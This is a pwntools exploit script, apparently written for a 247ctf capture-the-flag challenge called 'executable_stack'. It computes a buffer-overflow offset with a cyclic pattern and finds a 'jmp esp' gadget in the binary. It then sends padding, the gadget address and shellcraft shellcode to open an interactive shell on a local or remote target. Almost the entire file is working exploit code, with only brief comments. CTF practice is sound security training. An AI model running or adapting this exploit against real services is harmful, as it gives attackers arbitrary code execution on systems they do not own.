from pwn import *
import sys

# Set the context for architecture and operating system
context.update(arch='i386', os='linux')

# Load the binary
binary = ELF("./executable_stack")

# Prompt the user to choose between local and remote process
choice = input("Run [local] process or [remote] connection? ").strip().lower()

if choice == 'local':
    # Start a local process
    io = process(binary.path)
elif choice == 'remote':
    # Prompt for the full remote address (e.g., "tcp://1e9ef81f79799de6.247ctf.com:50375")
    full_address = input("Enter the full remote address (format tcp://host:port): ").strip()
    host, port = full_address.split("://")[1].split(":")
    # Connect to the remote service
    io = remote(host, int(port))
else:
    print("Invalid choice. Exiting.")
    sys.exit(1)

# # Uncomment these lines for the initial phase to find the fault address
# # If debugging locally, attach GDB to process for interactive debugging
# if choice == 'local':
#     gdb.attach(io, 'continue')

# pattern = cyclic(512) # Generate a cyclic pattern to find the offset
# io.sendline(pattern)

# pause() # Pause the script to observe the state in GDB

# sys.exit() 
# # Comment out after finding the fault address

# Prompt the user for the fault address (e.g., address causing segmentation fault)
fault_address_hex = input("Enter the fault address in hexadecimal format (e.g., 0x6261616b): ")

# Convert the hexadecimal input to an integer
fault_address = int(fault_address_hex, 16)

# Use cyclic_find() to calculate the offset from the fault address
offset = cyclic_find(fault_address)

# Find the address of a 'jmp esp' instruction within the binary
jmp_esp_address = next(binary.search(asm('jmp esp')))

# Print the address of the found 'jmp esp' instruction
print(f"Address of jmp esp: {hex(jmp_esp_address)}")

# Construct the exploit payload with the calculated offset in byte format
exploit_payload = flat([b'A' * offset, jmp_esp_address, asm(shellcraft.sh())], word_size=32)

# Send the exploit payload to the binary
io.sendline(exploit_payload)
io.interactive()